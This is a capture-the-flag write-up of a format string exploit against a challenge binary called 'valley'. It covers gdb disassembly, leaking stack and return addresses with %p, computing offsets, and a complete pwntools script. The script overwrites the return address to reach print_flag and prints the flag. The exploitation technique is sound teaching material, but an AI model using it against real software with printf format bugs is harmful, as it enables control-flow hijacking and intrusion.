We are once again given a binary and it's source code. Running `file` on it gives us:
```
>> file valley
valley: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=389c2641f0d3caae81af5d21d9bb5bcf2de217f0, for GNU/Linux 3.2.0, with debug_info, not stripped
```

This is a PIE executable, so the memory addresses will be randomized. Opening up the valley.c file, we see that there is conveniently a print_flag() function, which we will try and exploit the program into jumping to. We'll need to somehow leak the stack and function addresses to be able to jump to the function. The program gets user input and prints it using `printf(buf);`, which gives us an opportunity to exploit a format string vulnerability. 

We'll use `gdb` and we'll disassemble the `echo_valley` function, so we can inspect the assembly and place breakpoints.
```
Dump of assembler code for function echo_valley:
   0x0000555555555307 <+0>:	endbr64
   0x000055555555530b <+4>:	push   rbp
   0x000055555555530c <+5>:	mov    rbp,rsp
   0x000055555555530f <+8>:	sub    rsp,0x70
   0x0000555555555313 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x000055555555531c <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000555555555320 <+25>:	xor    eax,eax
   0x0000555555555322 <+27>:	lea    rax,[rip+0xd37]        # 0x555555556060
   0x0000555555555329 <+34>:	mov    rdi,rax
   0x000055555555532c <+37>:	call   0x5555555550e0 <puts@plt>
   0x0000555555555331 <+42>:	mov    rax,QWORD PTR [rip+0x2cd8]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x0000555555555338 <+49>:	mov    rdi,rax
   0x000055555555533b <+52>:	call   0x555555555140 <fflush@plt>
   0x0000555555555340 <+57>:	mov    rdx,QWORD PTR [rip+0x2cd9]        # 0x555555558020 <stdin@GLIBC_2.2.5>
   0x0000555555555347 <+64>:	lea    rax,[rbp-0x70]
   0x000055555555534b <+68>:	mov    esi,0x64
   0x0000555555555350 <+73>:	mov    rdi,rax
   0x0000555555555353 <+76>:	call   0x555555555120 <fgets@plt>
   0x0000555555555358 <+81>:	test   rax,rax
   0x000055555555535b <+84>:	jne    0x555555555376 <echo_valley+111>
   0x000055555555535d <+86>:	lea    rax,[rip+0xd27]        # 0x55555555608b
   0x0000555555555364 <+93>:	mov    rdi,rax
   0x0000555555555367 <+96>:	call   0x5555555550e0 <puts@plt>
   0x000055555555536c <+101>:	mov    edi,0x0
   0x0000555555555371 <+106>:	call   0x555555555170 <exit@plt>
   0x0000555555555376 <+111>:	lea    rax,[rbp-0x70]
   0x000055555555537a <+115>:	lea    rdx,[rip+0xd24]        # 0x5555555560a5
   0x0000555555555381 <+122>:	mov    rsi,rdx
   0x0000555555555384 <+125>:	mov    rdi,rax
   0x0000555555555387 <+128>:	call   0x555555555130 <strcmp@plt>
   0x000055555555538c <+133>:	test   eax,eax
   0x000055555555538e <+135>:	jne    0x5555555553c1 <echo_valley+186>
   0x0000555555555390 <+137>:	lea    rax,[rip+0xd14]        # 0x5555555560ab
   0x0000555555555397 <+144>:	mov    rdi,rax
   0x000055555555539a <+147>:	call   0x5555555550e0 <puts@plt>
   0x000055555555539f <+152>:	nop
   0x00005555555553a0 <+153>:	mov    rax,QWORD PTR [rip+0x2c69]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x00005555555553a7 <+160>:	mov    rdi,rax
   0x00005555555553aa <+163>:	call   0x555555555140 <fflush@plt>
   0x00005555555553af <+168>:	nop
   0x00005555555553b0 <+169>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555553b4 <+173>:	sub    rax,QWORD PTR fs:0x28
   0x00005555555553bd <+182>:	je     0x5555555553ff <echo_valley+248>
   0x00005555555553bf <+184>:	jmp    0x5555555553fa <echo_valley+243>
   0x00005555555553c1 <+186>:	lea    rax,[rip+0xcf9]        # 0x5555555560c1
   0x00005555555553c8 <+193>:	mov    rdi,rax
   0x00005555555553cb <+196>:	mov    eax,0x0
   0x00005555555553d0 <+201>:	call   0x555555555110 <printf@plt>
   0x00005555555553d5 <+206>:	lea    rax,[rbp-0x70]
   0x00005555555553d9 <+210>:	mov    rdi,rax
   0x00005555555553dc <+213>:	mov    eax,0x0
   0x00005555555553e1 <+218>:	call   0x555555555110 <printf@plt>
   0x00005555555553e6 <+223>:	mov    rax,QWORD PTR [rip+0x2c23]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x00005555555553ed <+230>:	mov    rdi,rax
   0x00005555555553f0 <+233>:	call   0x555555555140 <fflush@plt>
   0x00005555555553f5 <+238>:	jmp    0x555555555331 <echo_valley+42>
   0x00005555555553fa <+243>:	call   0x555555555100 <__stack_chk_fail@plt>
   0x00005555555553ff <+248>:	leave
   0x0000555555555400 <+249>:	ret
```

We'll put a break point at 0x00005555555553e1 using `break *0x00005555555553e1` so we can inspect the stack as we print out the format string vulnerability.

First, we can leak some addresses by printing a bunch of `%p`. Printing the first 20 doesn't seem useful, but when I print the 20-30th pointers, I get some interesting results:
```
%20$p %21$p %22$p %23$p %24$p %25$p %26$p %27$p %28$p %29$p 
You heard in the distance: 0x7fffffffde50 0x555555555413 0x7fffffffdef0 0x7ffff7dc7488 0x7fffffffdea0 0x7fffffffdf78 0x155554040 0x555555555401 0x7fffffffdf78 0x3b1973a1a71acfea
```

In the 21st pointer (`%21$p)`), we get `0x555555555413`, which is the exact return address of our main function!
```
Dump of assembler code for function main:
   0x0000555555555401 <+0>:	endbr64
   0x0000555555555405 <+4>:	push   rbp
   0x0000555555555406 <+5>:	mov    rbp,rsp
   0x0000555555555409 <+8>:	mov    eax,0x0
   0x000055555555540e <+13>:	call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:	mov    eax,0x0
   0x0000555555555418 <+23>:	pop    rbp
   0x0000555555555419 <+24>:	ret
```
Not that it is 0x0000555555555413 because the return address points to the instruction that should be run *after* the function call is done.

pwndbg also gives us some interesting information about the registers, specifically RBP (the base pointer)
```
RBP  0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x7fffffffdef0 —▸ 0x7fffffffdf50 ◂— 0
```

Our 20th pointer seems to match one of the base pointers, which makes sense since the RBP is saved when a function is called!

With these two values leaked, we can calculate the offset to find the exact memory address. Our print_flag function is at 0x0000555555555269, so there is an offset of 0x0000555555555413 - 0x0000555555555269 = 426 bytes.

To find the exact address on the stack of the return address, we can dump out a bunch of hex values, starting from the base pointer
```
pwndbg> x/20xg $rbp
0x7fffffffde40:	0x00007fffffffde50	0x0000555555555413
0x7fffffffde50:	0x00007fffffffdef0	0x00007ffff7dc7488
0x7fffffffde60:	0x00007fffffffdea0	0x00007fffffffdf78
0x7fffffffde70:	0x0000000155554040	0x0000555555555401
0x7fffffffde80:	0x00007fffffffdf78	0x3b1973a1a71acfea
0x7fffffffde90:	0x0000000000000001	0x0000000000000000
0x7fffffffdea0:	0x00007ffff7ffd000	0x0000555555557d78
0x7fffffffdeb0:	0x3b1973a1a63acfea	0x3b1963e6f284cfea
0x7fffffffdec0:	0x00007fff00000000	0x0000000000000000
0x7fffffffded0:	0x0000000000000000	0x0000000000000001
```

Seems like our return address is at 0x7fffffffde48, which is 8 bytes away from the RBP at 0x7fffffffde40.

To execute a format string vulnerability, we'll use the python `pwntools` library which automates format string payloads. First, we'll need to know the offset of the first formatter we can control. `pwntools` gives us easy tools to do this:
```py
p = process("./valley")
print(p.recv())

def send_payload(payload):
    p.sendline(payload)
    return p.recv()
format_string = FmtStr(execute_fmt=send_payload)
print(format_string.offset)
```
The send_payload function sends a payload to the binary and returns the response it gives. `pwntools` can automatically send payloads to detect the offset, and it detected an offset of 6.

Next, we need to leak the function and stack pointers, and calculate the actual values.
```py
# leak address of main
p.sendline(b"%21$p")
leaked_main = p.recv().decode("utf-8").strip()[27:]
leaked_main = int(leaked_main, 16)
leaked_main -= 426 # offset

# leaked address of stack
p.sendline(b"%20$p")
leaked_stack = p.recv().decode("utf-8").strip()[27:]
leaked_stack = int(leaked_stack, 16)
leaked_stack -= 8 # offset

print(hex(leaked_main))
print(hex(leaked_stack))
```

Finally, we can use `fmtstr_payload` to craft a payload that will modify a value at a certain memory address.
```py
# Craft the payload to write the new value to the specified address
payload = fmtstr_payload(format_string.offset, {leaked_stack: leaked_main}, write_size="short")
p.sendline(payload)
print(p.recv())

# make the function return, and end up in the print_flag
p.sendline(b"exit")
print(p.recvall())
```
The write_size="short" is important (I got stuck on it for a while!) to reduce the size of the payload. This will attempt to write the values byte-by-byte, as opposed to all at once. The input buffer is only 100 bytes, so we need to make sure that our payload doesn't exceed that.

The full exploit looks like this:
```py
from pwn import *

context.log_level="DEBUG"
context.binary=ELF("./valley")

# Start the process
p = remote('shape-facility.picoctf.net', 58316)
#p = process("./valley")

# First line is just introduction
print(p.recv())

def send_payload(payload):
    p.sendline(payload)
    return p.recv()
format_string = FmtStr(execute_fmt=send_payload)
print(format_string.offset)

# leak address of main
p.sendline(b"%21$p")
leaked_main = p.recv().decode("utf-8").strip()[27:]
leaked_main = int(leaked_main, 16)
leaked_main -= 426 # offset

# leaked address of stack
p.sendline(b"%20$p")
leaked_stack = p.recv().decode("utf-8").strip()[27:]
leaked_stack = int(leaked_stack, 16)
leaked_stack -= 8 # offset

print(hex(leaked_main))
print(hex(leaked_stack))

# Craft the payload to write the new value to the specified address
payload = fmtstr_payload(format_string.offset, {leaked_stack: leaked_main}, write_size="short")
p.sendline(payload)
print(p.recv())

# make the function return, and end up in the print_flag
p.sendline(b"exit")
print(p.recvall())
```

And we get: 
```
\x00(h\xbdx\xfd\x7fThe Valley Disappears\nCongrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}\n'
```

I spent a long time debugging the program because it doesn't work locally when I try it on the binary, maybe due to more protections enabled. Sometimes you just have to test it on the server and pray it works.